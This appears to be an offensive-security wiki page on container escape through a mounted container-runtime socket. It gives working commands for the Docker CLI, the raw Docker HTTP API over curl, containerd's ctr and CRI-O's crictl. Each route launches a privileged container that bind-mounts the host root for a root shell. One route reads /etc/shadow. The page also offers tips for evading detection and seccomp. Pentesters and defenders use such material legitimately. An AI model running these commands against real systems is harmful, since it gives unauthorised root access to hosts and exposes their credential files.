---
title: "Runtime socket mount: controlling the host daemon through a mounted container socket"
description: "A container with the Docker, containerd, or CRI-O control socket bind-mounted talks to the host container daemon directly. Through that API an attacker launches a new, fully privileged container that bind-mounts the host root, giving root code execution on the host. Shown with the Docker CLI, the raw Docker HTTP API over the socket, containerd ctr, and CRI-O crictl."
keywords:
  - docker.sock
  - containerd socket
  - crictl
  - container escape
  - privileged container
---

# Runtime socket mount

Mounting a container runtime's control socket into a workload is one of the most dangerous misconfigurations, because that socket is the daemon's full control plane with no additional authentication. A process that can write to `/var/run/docker.sock` can instruct the host Docker daemon to start any container it likes, including one that is `--privileged` and bind-mounts the host root filesystem. The new container runs on the host as root, so the attacker reads and writes every host file. The same holds for the containerd and CRI-O sockets with their own clients.

Confirm the socket is present and reachable:

```bash
ls -l /var/run/docker.sock /run/containerd/containerd.sock /run/crio/crio.sock 2>/dev/null
# probe the Docker API directly, no docker CLI required
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/info | head
```

## Route: Docker socket

If the `docker` CLI is in the image, one command does it:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host --privileged --rm -it alpine \
  chroot /host sh
```

If no CLI is present, drive the raw HTTP API over the socket with `curl`. Create a container that binds the host root and is privileged, start it, and read its output:

```bash
# 1. Create the container (HostConfig.Binds mounts host / into /host; Privileged on)
cid=$(curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow; chroot /host sh -c id"],
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create | sed 's/.*"Id":"\([^"]*\)".*/\1/')

# 2. Start it, then stream the logs
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$cid/start
curl -s --unix-socket /var/run/docker.sock \
  "http://localhost/containers/$cid/logs?stdout=1&stderr=1"
```

For an interactive foothold, instead create the container with `"OpenStdin":true,"Tty":true`, then attach to `/containers/$cid/attach?stream=1&stdin=1&stdout=1`. If the target image is not already present, the API `POST /images/create?fromImage=alpine` pulls it first, or reuse an image that `GET /images/json` shows is already available.

## Route: containerd socket

containerd's socket is driven with `ctr`. Containers managed by Kubernetes live in the `k8s.io` namespace, so target that namespace:

```bash
ctr --address /run/containerd/containerd.sock namespace ls
ctr --address /run/containerd/containerd.sock -n k8s.io image ls | head
ctr --address /run/containerd/containerd.sock -n k8s.io run --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest esc chroot /host sh
```

## Route: CRI-O or CRI socket

A CRI socket (`crio.sock`, or a generic `cri.sock`) is driven with `crictl`. Define a privileged pod and container that mounts the host root:

```bash
export CONTAINER_RUNTIME_ENDPOINT=unix:///run/crio/crio.sock
# pod and container JSON specify privileged:true and a host / bind mount, then:
pod=$(crictl runp pod.json)
cid=$(crictl create $pod container.json pod.json)
crictl start $cid && crictl exec -it $cid chroot /host sh
```

## Exploitation notes

- The socket is unauthenticated: anyone who can write to it has full daemon control, so group membership or file mode on the socket inside the container is the only gate. `ls -l` on the socket shows whether your UID can write it.
- Launching a fresh privileged container is cleaner than trying to escape the current one: the new container is root on the host by construction, independent of the current container's capabilities and seccomp.
- The containerd and CRI routes matter in Kubernetes, where the node socket is sometimes mounted into a workload; combine with [Kubernetes pod escape to node](../../../orchestration/kubernetes/pod-escape-to-node/index.md).
- To avoid pulling an image, reuse one already on the host (`/images/json`, `ctr image ls`, `crictl images`); any Linux image works since you immediately `chroot` the host root.

## References

- [Docker Engine API reference](https://docs.docker.com/reference/api/engine/)
- [containerd ctr usage](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [HackTricks: Docker socket escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounted-docker-socket-escape)
